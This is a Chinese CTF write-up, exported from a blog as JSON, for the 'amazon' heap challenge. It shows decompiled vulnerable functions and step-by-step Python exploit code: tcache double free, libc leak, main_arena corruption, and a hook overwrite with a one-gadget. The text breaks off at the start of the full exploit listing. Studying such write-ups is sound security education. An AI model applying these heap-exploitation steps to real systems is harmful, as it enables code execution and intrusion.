{"title":"数字经济云安全CTF","slug":"数字经济云安全CTF","date":"2019-09-24T13:27:08.000Z","updated":"2019-11-19T11:24:51.202Z","comments":true,"path":"api/articles/数字经济云安全CTF.json","photos":[],"link":"","excerpt":"​    上周末跟着dl们混了一波所谓“数字经济云安全”众测大赛的比赛，最后队内的web师傅和misc师傅发挥神勇，而我和pwn的队友们则拖了后腿，所以只获得50名，着实有些可惜。虽然也算做出了一题半，但落实下来由于各种因素一面flag都没有得到，这值得我深刻反思。下面依次看一下两道pwn的题目。amazon审计buy1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>unsigned __int64 buy()<br>&#123;<br>  unsigned int number; // [rsp+4h] [rbp-1Ch]<br>  size_t nbytes; // [rsp+8h] [rbp-18h]<br>  __int64 count; // [rsp+10h] [rbp-10h]<br>  unsigned __int64 v4; // [rsp+18h] [rbp-8h]<br><br>  v4 = __readfsqword(0x28u);<br>  put_names();<br>  printf(\"What item do you want to buy: \");<br>  __isoc99_scanf(\"%d\", &amp;number);<br>  if ( number &lt;= 3 )<br>  &#123;<br>    printf(\"How many: \", &amp;number);<br>    __isoc99_scanf(\"%lu\", &amp;count);<br>    printf(\"How long is your note: \", &amp;count);<br>    __isoc99_scanf(\"%d\", &amp;nbytes);<br>    if ( (unsigned int)nbytes &lt;= 0x100 )<br>    &#123;<br>      for ( HIDWORD(nbytes) = 0; SHIDWORD(nbytes) &lt;= 47 &amp;&amp; qword_4080[SHIDWORD(nbytes)]; ++HIDWORD(nbytes) )<br>        ;<br>      if ( HIDWORD(nbytes) != 48 )<br>      &#123;<br>        qword_4080[SHIDWORD(nbytes)] = (char *)malloc((unsigned int)(nbytes + 40));<br>        strcpy(qword_4080[SHIDWORD(nbytes)], (&amp;off_4020)[number]);<br>        printf(\"Content: \");<br>        read(0, qword_4080[SHIDWORD(nbytes)] + 32, (unsigned int)nbytes);<br>        *(_QWORD *)&amp;qword_4080[SHIDWORD(nbytes)][(unsigned int)nbytes + 32] = count;<br>        puts(\"Done!\");<br>      &#125;<br>    &#125;<br>  &#125;<br>  return __readfsqword(0x28u) ^ v4;<br>&#125;<br>","covers":null,"content":"<p>​    上周末跟着dl们混了一波所谓“数字经济云安全”众测大赛的比赛，最后队内的web师傅和misc师傅发挥神勇，而我和pwn的队友们则拖了后腿，所以只获得50名，着实有些可惜。虽然也算做出了一题半，但落实下来由于各种因素一面flag都没有得到，这值得我深刻反思。下面依次看一下两道pwn的题目。</p>\n<h2 id=\"amazon\"><a href=\"#amazon\" class=\"headerlink\" title=\"amazon\"></a>amazon</h2><h3 id=\"审计\"><a href=\"#审计\" class=\"headerlink\" title=\"审计\"></a>审计</h3><h4 id=\"buy\"><a href=\"#buy\" class=\"headerlink\" title=\"buy\"></a>buy</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">buy</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> number; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> nbytes; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 count; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  put_names();</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"What item do you want to buy: \"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;number);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( number &lt;= <span class=\"number\">3</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"How many: \"</span>, &amp;number);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%lu\"</span>, &amp;count);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"How long is your note: \"</span>, &amp;count);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;nbytes);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)nbytes &lt;= <span class=\"number\">0x100</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( HIDWORD(nbytes) = <span class=\"number\">0</span>; SHIDWORD(nbytes) &lt;= <span class=\"number\">47</span> &amp;&amp; qword_4080[SHIDWORD(nbytes)]; ++HIDWORD(nbytes) )</span><br><span class=\"line\">        ;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( HIDWORD(nbytes) != <span class=\"number\">48</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        qword_4080[SHIDWORD(nbytes)] = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(nbytes + <span class=\"number\">40</span>));</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(qword_4080[SHIDWORD(nbytes)], (&amp;off_4020)[number]);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content: \"</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, qword_4080[SHIDWORD(nbytes)] + <span class=\"number\">32</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)nbytes);</span><br><span class=\"line\">        *(_QWORD *)&amp;qword_4080[SHIDWORD(nbytes)][(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)nbytes + <span class=\"number\">32</span>] = count;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done!\"</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>每次malloc的是size+40大小的chunk，都放在data段上。首先用strcpy将硬编码的名字字符串拷贝到chunk上，然后从chunk的0x20开始读入长度不大于0x100字节的内容，最终在chunk的<code>size+0x20</code>偏移处写入购买的个数。这里一开始认为存在整数溢出漏洞或者边界控制不当的漏洞，但是一番审计之后发现不存在这种漏洞，所以说该题也就没有直接的溢出漏洞。</p>\n<h4 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h4><p>show的时候，直接printf出0x0和0x20处的字符串，而没有判断是否是free的，所以可以借此泄漏libc。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int show()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char *v0; // rax</span><br><span class=\"line\">  signed int i; // [rsp+Ch] [rbp-4h]</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = 0; i &lt;= 47; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v0 = chunks[i];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v0 )</span><br><span class=\"line\">      LODWORD(v0) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name: %s, Note: %s\\n\"</span>, chunks[i], chunks[i] + 32);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">return</span> (signed int)v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"checkout\"><a href=\"#checkout\" class=\"headerlink\" title=\"checkout\"></a>checkout</h4><p>free掉对应的chunk，但是明显地存在UAF问题，从而也可以double free或者构造其它的操作。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">co</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Which item are you going to pay for: \"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &gt;= <span class=\"number\">0</span> &amp;&amp; v1 &lt;= <span class=\"number\">48</span> &amp;&amp; chunks[v1] )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunks[v1]); <span class=\"comment\">// 存在UAF</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such item\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>本题leak libc是相当容易的，因为题目中直接就有leak的函数，也不会检查是否被释放，所以直接show即可。</p>\n<p>leak完libc和heap addr之后的操作比较难，这里并没有想到如何利用。本题的难点如下：</p>\n<p><strong>虽然存在明显的UAF和double free，但是由于我们只能从堆块的0x20字节以后开始写，所以不能通过double free直接复写tcache堆块的next指针，从而直接实现任意地址分配。</strong></p>\n<p>所以我们可以想到此时只能靠构造overlapping，使得重叠部分足够大，得以溢出修改某个chunk的next指针。不过，比赛时并没有想到如何处理，后来仔细阅读并调试了ChaMD5团队的<a href=\"https://mp.weixin.qq.com/s/A0T1VJmfvPcWaBD5ubrbPA\" target=\"_blank\" rel=\"noopener\">writeup</a>，才茅塞顿开。</p>\n<p>让我们直接看exp吧：</p>\n<h4 id=\"Leak\"><a href=\"#Leak\" class=\"headerlink\" title=\"Leak\"></a>Leak</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x90</span>,<span class=\"string\">\"1\"</span>*<span class=\"number\">8</span>) \t   <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x80</span>,p64(<span class=\"number\">0</span>)) \t <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x30</span>,<span class=\"string\">\"3\"</span>*<span class=\"number\">8</span>) \t\t <span class=\"comment\"># 2</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x20</span>,<span class=\"string\">\";$0\\x00\"</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x20</span>,<span class=\"string\">\"2\"</span>*<span class=\"number\">8</span>)\t\t <span class=\"comment\"># 4</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">ru(<span class=\"string\">\"Name: \"</span>)</span><br><span class=\"line\">heap=u64(re(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))<span class=\"number\">-0x260</span> <span class=\"comment\"># 此处减去了IO缓冲区申请的堆空间</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(heap)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">6</span>):</span><br><span class=\"line\">    free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">ru(<span class=\"string\">\"Name: \"</span>)</span><br><span class=\"line\">lib=u64(re(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))<span class=\"number\">-0x3ebca0</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(lib)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>add两个chunk，size分别为0xb0和0xa0（会+0x20）</li>\n<li>将0xa0的chunk放到tcache中。</li>\n<li>add一个0x50的chunk，并放到tcache中，这里是构造将被溢出的chunk，从而实现tcache poisoning</li>\n<li>add两个0x40的chunk</li>\n<li><strong>free chunk0两次，从而令chunk0放到tcache中，并且自己指向自己，由于tcache是单向链表，所以这时候next指针指向本身。注意tcache的检查很松（至少题目所给的libc-2.27.so版本），所以可以连续free两次</strong></li>\n<li>然后调用show方法，leak出堆地址</li>\n<li><strong>再连续free chunk0六次，前五次会将0xb0的tcache数组填满，从而第六次free的时候，chunk0会被放入unsorted bin中，由于unsorted bin是双向数组，此时chunk0的fd、bk会指向main_arena</strong></li>\n<li>再调用show方法，可以leak出堆地址</li>\n</ul>\n<h4 id=\"Overlapping\"><a href=\"#Overlapping\" class=\"headerlink\" title=\"Overlapping\"></a>Overlapping</h4><p>此时的关键点是，chunk0即在tcache中，又在unsorted bin中。而如果再申请相应大小的堆块时，会优先从tcache中取，取完后chunk0的next指针（也就是unsorted bin的fd指针）指向main_arena，所以会再再次申请时会申请到main_arena上去，也就可以修改main_arena的结构了。</p>\n<p>main_arena的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">/* Serialize access.  */</span></span><br><span class=\"line\">    __libc_lock_define(, mutex);</span><br><span class=\"line\">    <span class=\"comment\">/* Flags (formerly in max_fast).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> flags;</span><br><span class=\"line\">    <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class=\"line\">    <span class=\"comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class=\"line\">    mchunkptr top; <span class=\"comment\">// top chunk的地址</span></span><br><span class=\"line\">    <span class=\"comment\">/* The remainder from the most recent split of a small request */</span></span><br><span class=\"line\">    mchunkptr last_remainder;</span><br><span class=\"line\">    <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">    mchunkptr bins[ NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span> ];</span><br><span class=\"line\">    <span class=\"comment\">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> binmap[ BINMAPSIZE ];</span><br><span class=\"line\">    <span class=\"comment\">/* Linked list, points to the next arena */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">    <span class=\"comment\">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class=\"line\"><span class=\"comment\">       by free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next_free</span>;</span></span><br><span class=\"line\">    <span class=\"comment\">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class=\"line\"><span class=\"comment\">       the free list.  Access to this field is serialized by</span></span><br><span class=\"line\"><span class=\"comment\">       free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T attached_threads;</span><br><span class=\"line\">    <span class=\"comment\">/* Memory allocated from the system in this arena.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T system_mem;</span><br><span class=\"line\">    INTERNAL_SIZE_T max_system_mem;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>调试时的情况如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/100gx 0x7f466bc50ca0-96</span><br><span class=\"line\">0x7f466bc50c40 &lt;main_arena&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f466bc50c50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f466bc50c60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f466bc50c70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f466bc50c80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f466bc50c90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f466bc50ca0 &lt;main_arena+96&gt;:\t0x00005654b64314c0\t0x0000000000000000</span><br><span class=\"line\">0x7f466bc50cb0 &lt;main_arena+112&gt;:\t0x00005654b6431250\t0x00005654b6431250</span><br><span class=\"line\">0x7f466bc50cc0 &lt;main_arena+128&gt;:\t0x00007f466bc50cb0\t0x00007f466bc50cb0</span><br><span class=\"line\">0x7f466bc50cd0 &lt;main_arena+144&gt;:\t0x00007f466bc50cc0\t0x00007f466bc50cc0</span><br></pre></td></tr></table></figure>\n<p>main_arena的0x0～0x80是fastbin，0x80开始是top chunk，后面是last remainder，之后的首先是unsorted bin，也就是说我们可以分配到<code>main_arena+122</code>的地址，而且可以向<code>main_arena+122+0x20</code>的地址处确定性的写入，所以我们将某个small_bin的指针修改为我们fake的chunk，从而可以将相应的fake chunk分配出去。而如果这个fake chunk与物理相邻的下一个chunk overlapping，那么bingo！</p>\n<p>我们首先将0xa0的chunk再次申请（即预留的chunk1的位置），而且在其中构造一个<code>fake smallbin chunk</code>。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x80</span>,<span class=\"string\">\"y\"</span>*<span class=\"number\">0x60</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x51</span>)+p64(lib+<span class=\"number\">0x3ebce0</span>)*<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>fake_presize = 0</li>\n<li>fake_size = 0x51</li>\n<li>fake_fd = main_arena上相应地址</li>\n<li>fake_fd = main_arena上相应地址</li>\n</ul>\n<p>再申请两次，第二次申请时分配到main_arena上，注意尽量保持无关的结构不变。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>,<span class=\"number\">0x90</span>,p64(lib+<span class=\"number\">0x3ebcb0</span>)*<span class=\"number\">2</span>+p64(lib+<span class=\"number\">0x3ebcc0</span>)*<span class=\"number\">2</span>+p64(lib+<span class=\"number\">0x3ebcd0</span>)*<span class=\"number\">2</span>+p64(heap+<span class=\"number\">0x340</span>+<span class=\"number\">0x60</span>)*<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<p>调试可知：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/64gx 0x7fc984777c40+96</span><br><span class=\"line\">0x7fc984777ca0 &lt;main_arena+96&gt;:\t0x616853206b6c694d\t0x000000000000656b</span><br><span class=\"line\">0x7fc984777cb0 &lt;main_arena+112&gt;:\t0x0000556633372250\t0x0000556633372250</span><br><span class=\"line\">0x7fc984777cc0 &lt;main_arena+128&gt;:\t0x00007fc984777cb0\t0x00007fc984777cb0 # </span><br><span class=\"line\">0x7fc984777cd0 &lt;main_arena+144&gt;:\t0x00007fc984777cc0\t0x00007fc984777cc0 # </span><br><span class=\"line\">0x7fc984777ce0 &lt;main_arena+160&gt;:\t0x00007fc984777cd0\t0x00007fc984777cd0 # 这0x30个字节保持原样</span><br><span class=\"line\">0x7fc984777cf0 &lt;main_arena+176&gt;:\t0x00005566333723a0\t0x00005566333723a0 # smallbin[4]，指向fake chunk</span><br><span class=\"line\">0x7fc984777d00 &lt;main_arena+192&gt;:\t0x00007fc984777cf0\t0x00007fc984777cf0</span><br><span class=\"line\">0x7fc984777d10 &lt;main_arena+208&gt;:\t0x00007fc984777d00\t0x00007fc984777d00</span><br><span class=\"line\">0x7fc984777d20 &lt;main_arena+224&gt;:\t0x00007fc984777d10\t0x00007fc984777d10</span><br><span class=\"line\">0x7fc984777d30 &lt;main_arena+240&gt;:\t0x00007fc984777d20\t0x00007fc984777d20</span><br><span class=\"line\">0x7fc984777d40 &lt;main_arena+256&gt;:\t0x00007fc984777d30\t0x00007fc984777d30</span><br><span class=\"line\">0x7fc984777d50 &lt;main_arena+272&gt;:\t0x0000000000000010\t0x00007fc984777d40 # 写入size 0x10</span><br><span class=\"line\">0x7fc984777d60 &lt;main_arena+288&gt;:\t0x00007fc984777d50\t0x00007fc984777d50</span><br><span class=\"line\">0x7fc984777d70 &lt;main_arena+304&gt;:\t0x00007fc984777d60\t0x00007fc984777d60</span><br></pre></td></tr></table></figure>\n<p>让我们回忆一下CTF Wiki中的tcache机制讲解。</p>\n<blockquote>\n<p>（1）首先，申请的内存块符合 fastbin 大小时并且找到在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p>\n<p>（2）其次，申请的内存块符合 smallbin 大小时并且找到在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</p>\n<p>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</p>\n</blockquote>\n<p>所以下次分配0x40时，会分配到fake chunk处（先放入tcache，再从tcache中取），溢出chunk3。而chunk3原本在tcache中，所以可以直接写tcache的next指针，下下次分配0x50的时候分配到任意地址，最终实现任意地址写</p>\n<h4 id=\"Hijacking\"><a href=\"#Hijacking\" class=\"headerlink\" title=\"Hijacking\"></a>Hijacking</h4><p>本题还有第二个难点，就是在劫持控制流的时候有一个大坑。</p>\n<p>一般来说，我们会选择覆盖<code>malloc_hook</code>或者<code>free_hook</code>。本题我们如果选择劫持<code>__malloc_hook</code>为one_shot，会发现三个约束条件都不能满足。这时我们一般会想到覆盖<code>__free_hook</code>，但是由于<code>__free_hook</code>前方是与IO相关的关键数据结构，而我们不得不写入0x20的垃圾字节，这会使得控制流劫持同样失败。</p>\n<p>最后还是参考大师傅们的骚操作：选择将<code>__realloc_hook</code>覆盖为one_shot，将<code>__malloc_hook</code>覆盖为<code>realloc+9</code>（跳过函数初始化一堆可能影响栈布局和控制流的push操作）。这样在调用malloc时，会跳转到realloc，而又会再劫持到realloc_hook。同时，这两个的地址在libc上相邻，方便写入。</p>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span 